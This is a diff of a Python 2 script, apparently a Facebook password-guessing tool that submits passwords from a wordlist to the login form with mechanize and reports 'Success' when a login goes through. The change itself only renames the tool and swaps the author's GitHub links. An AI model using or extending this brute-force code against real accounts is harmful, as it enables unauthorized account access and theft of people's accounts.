@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# Pesbuk Checker
+# Pesbuk SQL
 # Coded by Senja
-# Github: github.com/thedarksec/Pesbukchecker
+# Github: github.com/stepbystepexe/Pesbuksql
 
 import os, sys, time, random, cookielib, mechanize
 
@@ -106,7 +106,7 @@ def word(lst_password):
         ok = br.submit()
         mask = ok.geturl()
         if mask != login and (not 'login_attempt' in mask):
-                        os.system('xdg-open https://github.com/thedarksec/')
+                        os.system('xdg-open https://github.com/stepbystepexe/')
                         print
                         print ('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mSuccess')
                         print ('\x1b[0m[\x1b[96;1m&\x1b[0m] \x1b[77;1mChecker Password Find')
